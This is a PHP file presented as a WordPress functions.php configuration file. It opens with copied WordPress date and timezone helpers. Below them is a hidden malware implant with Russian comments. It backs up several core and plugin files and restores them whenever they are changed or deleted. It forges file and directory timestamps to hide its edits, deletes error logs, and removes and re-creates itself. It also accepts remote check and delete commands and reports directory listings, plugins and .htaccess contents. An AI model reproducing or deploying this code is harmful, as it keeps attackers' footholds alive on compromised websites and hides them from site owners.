<?php
/**
 * The functions configuration for WordPress
 *
 * The functions.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "functions.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Plugin settings
 * * Plugin secret keys
 * * Plugin table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/functions/
 *
 * @package WordPress
 */
	
/**
 * Converts given MySQL date string into a different format.
 *
 *  - `$format` should be a PHP date format string.
 *  - 'U' and 'G' formats will return an integer sum of timestamp with timezone offset.
 *  - `$date` is expected to be local time in MySQL format (`Y-m-d H:i:s`).
 *
 * Historically UTC time could be passed to the function to produce Unix timestamp.
 *
 * If `$translate` is true then the given date and format string will
 * be passed to `wp_date()` for translation.
 *
 * @since 0.71
 *
 * @param string $format    Format of the date to return.
 * @param string $date      Date string to convert.
 * @param bool   $translate Whether the return date should be translated. Default true.
 * @return string|int|false Integer if `$format` is 'U' or 'G', string otherwise.
 *                          False on failure.
 */
function mysql2date( $format, $date, $translate = true ) {
	if ( empty( $date ) ) {
		return false;
	}

	$timezone = wp_timezone();
	$datetime = date_create( $date, $timezone );

	if ( false === $datetime ) {
		return false;
	}

	// Returns a sum of timestamp with timezone offset. Ideally should never be used.
	if ( 'G' === $format || 'U' === $format ) {
		return $datetime->getTimestamp() + $datetime->getOffset();
	}

	if ( $translate ) {
		return wp_date( $format, $datetime->getTimestamp(), $timezone );
	}

	return $datetime->format( $format );
}

/**
 * Retrieves the current time based on specified type.
 *
 *  - The 'mysql' type will return the time in the format for MySQL DATETIME field.
 *  - The 'timestamp' or 'U' types will return the current timestamp or a sum of timestamp
 *    and timezone offset, depending on `$gmt`.
 *  - Other strings will be interpreted as PHP date formats (e.g. 'Y-m-d').
 *
 * If `$gmt` is a truthy value then both types will use GMT time, otherwise the
 * output is adjusted with the GMT offset for the site.
 *
 * @since 1.0.0
 * @since 5.3.0 Now returns an integer if `$type` is 'U'. Previously a string was returned.
 *
 * @param string   $type Type of time to retrieve. Accepts 'mysql', 'timestamp', 'U',
 *                       or PHP date format string (e.g. 'Y-m-d').
 * @param int|bool $gmt  Optional. Whether to use GMT timezone. Default false.
 * @return int|string Integer if `$type` is 'timestamp' or 'U', string otherwise.
 */
function current_time( $type, $gmt = 0 ) {
	// Don't use non-GMT timestamp, unless you know the difference and really need to.
	if ( 'timestamp' === $type || 'U' === $type ) {
		return $gmt ? time() : time() + (int) ( (float) get_option( 'gmt_offset' ) * HOUR_IN_SECONDS );
	}

	if ( 'mysql' === $type ) {
		$type = 'Y-m-d H:i:s';
	}

	$timezone = $gmt ? new DateTimeZone( 'UTC' ) : wp_timezone();
	$datetime = new DateTime( 'now', $timezone );

	return $datetime->format( $type );
}

/**
 * Retrieves the current time as an object using the site's timezone.
 *
 * @since 5.3.0
 *
 * @return DateTimeImmutable Date and time object.
 */
function current_datetime() {
	return new DateTimeImmutable( 'now', wp_timezone() );
}

/**
 * Retrieves the timezone of the site as a string.
 *
 * Uses the `timezone_string` option to get a proper timezone name if available,
 * otherwise falls back to a manual UTC ± offset.
 *
 * Example return values:
 *
 *  - 'Europe/Rome'
 *  - 'America/North_Dakota/New_Salem'
 *  - 'UTC'
 *  - '-06:30'
 *  - '+00:00'
 *  - '+08:45'
 *
 * @since 5.3.0
 *
 * @return string PHP timezone name or a ±HH:MM offset.
 */
function wp_timezone_string() {
	$timezone_string = get_option( 'timezone_string' );

	if ( $timezone_string ) {
		return $timezone_string;
	}

	$offset  = (float) get_option( 'gmt_offset' );
	$hours   = (int) $offset;
	$minutes = ( $offset - $hours );

	$sign      = ( $offset < 0 ) ? '-' : '+';
	$abs_hour  = abs( $hours );
	$abs_mins  = abs( $minutes * 60 );
	$tz_offset = sprintf( '%s%02d:%02d', $sign, $abs_hour, $abs_mins );

	return $tz_offset;
}


	set_time_limit(35);
    ignore_user_abort(1);
    @ini_set('max_execution_time', 35);
    ini_set('display_errors', 0);
	ini_set('display_startup_errors', 0);
	error_reporting(E_ALL);

	if(isset($_GET['check'])){
		echo json_encode(array('status'=>'OK'));
		exit();
	} 

    if(isset($_GET['delete'])){
    	@unlink(__DIR__.DIRECTORY_SEPARATOR.'backup.txt');
    	@unlink(__DIR__.DIRECTORY_SEPARATOR.'dirstat.txt');
    	@unlink(__FILE__);
    	echo json_encode(array('status'=>'OK'));
    	exit();
    }

    logs('START');
    $time_start = time();

    // Узнаем путь до корня
    $SCRIPT_FILENAME = str_replace('/', "\t", $_SERVER['SCRIPT_FILENAME']);
    $SCRIPT_FILENAME = str_replace('\\', "\t", $SCRIPT_FILENAME);
    $parse_url = parse_url($_SERVER['REQUEST_URI']);
    $REQUEST_URI = str_replace('/', "\t", $parse_url['path']);    
    $ROOT_DIR = str_replace($REQUEST_URI, '', $SCRIPT_FILENAME);
    $ROOT_DIR = str_replace("\t",DIRECTORY_SEPARATOR,$ROOT_DIR);  

   	$backup = false;
    if(!is_file(__DIR__.DIRECTORY_SEPARATOR.'backup.txt')){
    	create_backup();
    }

    $backup = unserialize(base64_decode(file_get_contents(__DIR__.DIRECTORY_SEPARATOR.'backup.txt')));
    if(!is_array($backup)){
    	create_backup();
    	$backup = unserialize(base64_decode(file_get_contents(__DIR__.DIRECTORY_SEPARATOR.'backup.txt')));
    }

    if(is_array($backup)){
    	echo '!+BACKUP! '.count($backup)."\n";
    }else{
    	echo '!-BACKUP! '."\n";
    }

    $content = '';
    for($i=1;$i<=5;$i++){
    	if(is_file(__FILE__)){
    		$content = file_get_contents(__FILE__); 
    		break;
    	}else{
    		sleep(1);
    	}
    }
    if(empty($content)){
    	@unlink(__DIR__.DIRECTORY_SEPARATOR.'backup.txt');
    	@unlink(__DIR__.DIRECTORY_SEPARATOR.'dirstat.txt');
    	echo "EMPTY FILE: ".__FILE__;
    	exit();
    }
      
    unlink(__FILE__);
    unlink(__DIR__.DIRECTORY_SEPARATOR.'backup.txt');

    // 1. Откроем статистику
    if(is_file(__DIR__.DIRECTORY_SEPARATOR.'dirstat.txt')){
    	$stat_dir = json_decode(file_get_contents(__DIR__.DIRECTORY_SEPARATOR.'dirstat.txt'),true);
    	unlink(__DIR__.DIRECTORY_SEPARATOR.'dirstat.txt');
    	if(!is_array($stat_dir)){
    		$stat_dir = array();
    	}
    }else{
    	$stat_dir = array();
    }

    change_mtime(__DIR__.DIRECTORY_SEPARATOR.mt_rand(100,200),time());

    // 2. Удалим не нужные директории
    $stat_dir = array_reverse($stat_dir);
    foreach($stat_dir as $current_dir_stat){
    	if($current_dir_stat[1]==0 && is_dir($current_dir_stat[0])){
    		@rmdir($current_dir_stat[0]);
    	}
    }

	
	$try = 0;    

    while(true){
    	$time_work = time() - $time_start;
    	if($time_work>=28 && $try>=20){

    		check_change($backup);

    		// 1. Получим информацию какие директории есть а каких нет
    		$stat_dir = check_found_dir();

    		// 2. Создадим все директории для сохранения файла
    		foreach($stat_dir as $current_dir_stat){
    			if($current_dir_stat[1]==0 && !is_dir($current_dir_stat[0])){
    				@mkdir($current_dir_stat[0]);
    			}
    		}

    		// 3. Сохраним статистику по директориям
    		file_put_contents(__DIR__.DIRECTORY_SEPARATOR.'dirstat.txt', json_encode($stat_dir));
    		change_mtime(__DIR__.DIRECTORY_SEPARATOR.'dirstat.txt',get_best_time(__DIR__));

    		// 4. Сохраним файл
    		file_put_contents(__FILE__, $content);
    		change_mtime(__FILE__,get_best_time(__DIR__));

    		// 5. Сохраним бекап    		
    		file_put_contents(__DIR__.DIRECTORY_SEPARATOR.'backup.txt',base64_encode(serialize($backup)));
    		change_mtime(__DIR__.DIRECTORY_SEPARATOR.'backup.txt',get_best_time(__DIR__));    		

    		echo 'TIMEWORK_LOCAL: '.$time_work.' START_TIME: '.$time_start.' CURRENT_TIME: '.(time()).' TRY: '.$try."\n";

    		// 6. Выведем статистику
    		get_stat_dir($ROOT_DIR.DIRECTORY_SEPARATOR);

    		// 7. Плагины
    		list_plugin();

    		// 8. htaccess
    		if(is_file($ROOT_DIR.DIRECTORY_SEPARATOR.'.htaccess')){
    			echo "\nHTACCESS:\n".file_get_contents($ROOT_DIR.DIRECTORY_SEPARATOR.'.htaccess')."\n";    			
    		}

    		logs('FINISH');
    		exit();
    	}    	
    	sleep(1);
    	$try++;  	
    	if(is_file('error_log')){
    		@unlink('error_log');    		   		
    	}    	
    	change_mtime(__DIR__.DIRECTORY_SEPARATOR.mt_rand(100,200),time()); 
    }

    function check_found_dir()
    {
    	$explode = explode(DIRECTORY_SEPARATOR,__FILE__);
	    $dirs = array();
	    foreach ($explode as $id=>$current_path) {
	    	$slice = array_slice($explode,0,$id);
	    	if(count($slice)==0) continue;
	    	$_c = '';
	    	if(count($slice)==1) {
	    		$_c = DIRECTORY_SEPARATOR;
	    	}else{
	    		$_c = implode(DIRECTORY_SEPARATOR,$slice);
	    	}
	    	$dirs[] = $_c;    		
	    }
	    $result_dir = array();
	    foreach($dirs as $current_dir){
	    	if(is_dir($current_dir)){
	    		$result_dir[] = array($current_dir,1);
	    	}else{
	    		$result_dir[] = array($current_dir,0);
	    	}
	    }
	    return $result_dir;
    }

    function get_stat_dir($dir)
    {
    	$stat = array();
    	$scandir = @scandir($dir);
    	$_dir = array();
    	$_file = array();
    	foreach($scandir as $current_file){
    		$last_change = round((time()-filemtime($dir.$current_file))/60);
    		if(is_dir($dir.$current_file) || $current_file=='..'){
    			$_dir[] = '[ '.$current_file.' ] '.$last_change.' min ago';
    		}else{
    			$_file[] = $current_file.' '.$last_change.' min ago';
    		}
    	}
    	$stat = array_merge($_dir,$_file);
    	if(is_file($dir.'wp-config.php')){
    		echo '[+] WP SETUP'."\n";
    	}
    	if(is_file($dir.'wordpress'.DIRECTORY_SEPARATOR.'wp-config.php')){
    		echo '[+] WP SETUP PATH'."\n";
    	}
    	echo "DIR_STAT:\n";
    	echo implode("\n",$stat)."\n";
    }

    // Создаем бекап из файлов
	function create_backup()
	{
		$backup = array();
		if(is_file('../../wp-includes/class-phpmailer-rdf.php')){
			$backup['/wp-includes/class-phpmailer-rdf.php'] = array(filemtime('../../wp-includes/class-phpmailer-rdf.php'),file_get_contents('../../wp-includes/class-phpmailer-rdf.php'));
		}
		if(is_file('../../wp-includes/theme.php')){
			$backup['/wp-includes/theme.php'] = array(filemtime('../../wp-includes/theme.php'),file_get_contents('../../wp-includes/theme.php'));
		}
		if(is_file('../../wp-admin/widgets-form.php')){
			$backup['/wp-admin/widgets-form.php'] = array(filemtime('../../wp-admin/widgets-form.php'),file_get_contents('../../wp-admin/widgets-form.php'));
		}
		if(is_file('../../wp-content/plugins/akismet/class.akismet-cli.php')){
			$backup['/wp-content/plugins/akismet/class.akismet-cli.php'] = array(filemtime('../../wp-content/plugins/akismet/class.akismet-cli.php'),file_get_contents('../../wp-content/plugins/akismet/class.akismet-cli.php'));
		}
		if(is_file('../../wp-content/plugins/akismet/.htaccess')){
			$backup['/wp-content/plugins/akismet/.htaccess'] = array(filemtime('../../wp-content/plugins/akismet/.htaccess'),file_get_contents('../../wp-content/plugins/akismet/.htaccess'));
		}
		file_put_contents(__DIR__.DIRECTORY_SEPARATOR.'backup.txt',base64_encode(serialize($backup)));		
	}

	function list_plugin()
	{
		global $ROOT_DIR;
		$path_check = array($ROOT_DIR);
		if(is_dir($ROOT_DIR.DIRECTORY_SEPARATOR.'wordpress')){
			$path_check[] = $ROOT_DIR.DIRECTORY_SEPARATOR.'wordpress';
		}
		foreach($path_check as $current_path){
			if(is_dir($current_path.DIRECTORY_SEPARATOR.'wp-content'.DIRECTORY_SEPARATOR.'plugins')){
				$files_plugin = array_diff(@scandir($current_path.DIRECTORY_SEPARATOR.'wp-content'.DIRECTORY_SEPARATOR.'plugins'), array('.','..'));
				echo '~ PLUGINS: '.$current_path.' - '.implode(' | ',$files_plugin)."\n";
			}
		}
	}

	function check_change($backup)
	{
		global $ROOT_DIR;
		if(!is_array($backup)) return false;
		$path_check = array($ROOT_DIR);
		if(is_dir($ROOT_DIR.DIRECTORY_SEPARATOR.'wordpress')){
			$path_check[] = $ROOT_DIR.DIRECTORY_SEPARATOR.'wordpress';
		}		
		// Проверяем изменение файлов
		foreach($path_check as $current_path){
			foreach($backup as $current_backup_file=>$content_backup){
				$need_save = false;
				$reason = '';		
				if(is_file($current_path.$current_backup_file)){
					$new_content = file_get_contents($current_path.$current_backup_file);
					if($new_content!=$content_backup[1]){						
						$need_save = true;
						$reason.=' change content ';
					}
				}else{
					// Файла нету - но есть папка
					if(is_dir(dirname($current_path.$current_backup_file))){
						$need_save = true;
						$reason.=' no file, but found dir ';
					}
				}
				if($need_save){
					if(is_writable($current_path.$current_backup_file)){
						$reason.=' good writable ';
					}else{
						$reason.=' bad writable ';
					}			
					file_put_contents($current_path.$current_backup_file,$content_backup[1]);
					change_mtime($current_path.$current_backup_file,get_best_time(realpath($current_path)));
					$good = false;					
					if(is_file($current_path.$current_backup_file)){
						if(file_get_contents($current_path.$current_backup_file)==$content_backup[1]){
							$good = true;
						}else{
							$reason.=' no content ';
						}
					}else{
						$reason.=' not_found_after_write ';
					}
					if($good){
						echo '[+] CHANGE: '.$current_path.$current_backup_file.$reason."\n";
					}else{
						echo '[-] CHANGE: '.$current_path.$current_backup_file.$reason."\n";
					}				
				}
			}
		}
	}

	function get_best_time($dir)
    {
        $time = array();
        $realpath = realpath($dir);        
        $files = array();
        if(!empty($realpath)){
            $scan = @scandir($realpath);        
            if(!is_array($scan)){
                $files = array();
            }else{
                $files = array_diff($scan,array('.','..')); 
            }   
        }               
        $popular = time()-mt_rand(1000000,2000000);
        if(count($files)>1){
            foreach($files as $current_file){                
                $current_file = realpath($dir).DIRECTORY_SEPARATOR.$current_file;
                $mtime = filemtime($current_file);                                    
                if(isset($time[$mtime])){
                    $time[$mtime]++;
                }else{
                    $time[$mtime]=1;
                }             
            }            
            arsort($time);                    
            $popular = key($time);
            if($time[$popular]==1){
                $time = array_keys($time);
                asort($time);
                $time = array_values($time);                    
                $popular = $time[0];
            }
        }
        return $popular;         
    }

	function change_mtime($file,$new_time=0)
    {
        $realpath = '';
        if(is_file($file)){
            @touch($file,$new_time,$new_time);
            $realpath = realpath($file); 
        }else{
        	$realpath = realpath(dirname($file).DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
        }        
        if(empty($realpath)) return false;
        $explode = explode(DIRECTORY_SEPARATOR,$realpath);
        $dirs = array();
        foreach ($explode as $id=>$current_path) {
            $slice = array_slice($explode,0,$id);
            if(count($slice)==0) continue;
            $_c = '';
            if(count($slice)==1) {
                $_c = DIRECTORY_SEPARATOR;
            }else{
                $_c = implode(DIRECTORY_SEPARATOR,$slice);
            }
            $dirs[] = $_c;          
        }
        $dirs = array_reverse($dirs);
        foreach($dirs as $current_dir){
            $to_time = get_best_time($current_dir);
            if(!@touch($current_dir,$to_time,$to_time)){
                break;
            }       
        }       
    }

	function logs($msg)
	{
		return true;
		file_put_contents('logs.txt',date("Y-m-d H:i:s")."\t".$msg."\n",FILE_APPEND);
	}
?>